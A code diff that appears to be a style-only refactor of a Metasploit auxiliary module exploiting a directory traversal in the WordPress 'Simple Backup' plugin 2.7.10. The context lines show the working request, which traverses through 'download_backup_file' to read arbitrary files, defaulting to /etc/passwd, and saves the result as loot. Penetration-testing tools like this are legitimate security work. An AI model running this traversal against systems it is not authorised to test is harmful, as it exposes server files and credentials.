@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,37 +7,36 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WordPress Simple Backup File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in WordPress Plugin
-        "Simple Backup" version 2.7.10, allowing to read arbitrary files with the
-        web server privileges.
-      },
-      'References'     =>
-        [
-          ['WPVDB', '7997'],
-          ['PACKETSTORM', '131919']
-        ],
-      'Author'         =>
-        [
-          'Mahdi.Hidden', # Vulnerability Discovery
-          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'WordPress Simple Backup File Read Vulnerability',
+                      'Description'    => %q(
+                        This module exploits a directory traversal vulnerability in WordPress Plugin
+                        "Simple Backup" version 2.7.10, allowing to read arbitrary files with the
+                        web server privileges.
+                      ),
+                      'References'     =>
+                        [
+                          ['WPVDB', '7997'],
+                          ['PACKETSTORM', '131919']
+                        ],
+                      'Author'         =>
+                        [
+                          'Mahdi.Hidden', # Vulnerability Discovery
+                          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def check
@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri'    => normalize_uri(wordpress_url_backend, 'tools.php'),
       'vars_get' =>
         {
-          'page'  => 'backup_manager',
+          'page' => 'backup_manager',
           'download_backup_file' => "#{traversal}#{filename}"
         }
     )
@@ -64,13 +64,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.code == 200 &&
-        res.body.length > 0 &&
-        res.headers['Content-Disposition'] &&
-        res.headers['Content-Disposition'].include?('attachment; filename') &&
-        res.headers['Content-Length'] &&
-        res.headers['Content-Length'].to_i > 0
+       !res.body.empty? &&
+       res.headers['Content-Disposition'] &&
+       res.headers['Content-Disposition'].include?('attachment; filename') &&
+       res.headers['Content-Length'] &&
+       res.headers['Content-Length'].to_i > 0
 
-      vprint_line("#{res.body}")
+      vprint_line(res.body.to_s)
       fname = datastore['FILEPATH']
 
       path = store_loot(
